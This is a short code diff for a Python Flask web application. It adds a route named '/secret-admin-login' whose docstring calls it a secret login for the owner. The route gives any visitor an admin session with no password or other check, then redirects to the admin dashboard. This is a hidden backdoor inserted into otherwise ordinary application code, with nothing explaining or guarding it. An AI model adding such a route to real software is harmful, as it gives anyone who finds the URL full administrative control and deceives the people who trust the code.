@@ -640,6 +640,13 @@ def admin_dashboard():
     
     return admin_html
 
+@app.route('/secret-admin-login')
+def secret_admin_login():
+    """Secret admin login for owner"""
+    session['username'] = 'admin'
+    session['is_admin'] = True
+    return redirect(url_for('admin_dashboard'))
+
 @app.route('/guide/<guide_name>')
 def guide_detail(guide_name):
     """Show specific guide content"""
